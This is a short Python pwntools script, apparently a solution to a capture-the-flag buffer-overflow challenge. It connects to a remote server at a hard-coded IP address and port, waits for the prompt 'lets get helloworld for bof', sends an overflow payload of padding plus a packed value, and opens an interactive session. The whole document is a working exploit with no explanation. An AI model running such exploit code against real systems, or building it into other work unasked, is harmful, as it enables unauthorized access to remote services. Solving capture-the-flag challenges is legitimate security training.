from pwn import *

sh = remote('111.200.241.244',56790)
payload = b'A' * 4 + p64(0x6E756161)
sh.recvuntil("lets get helloworld for bof")
sh.sendline(payload)
sh.interactive()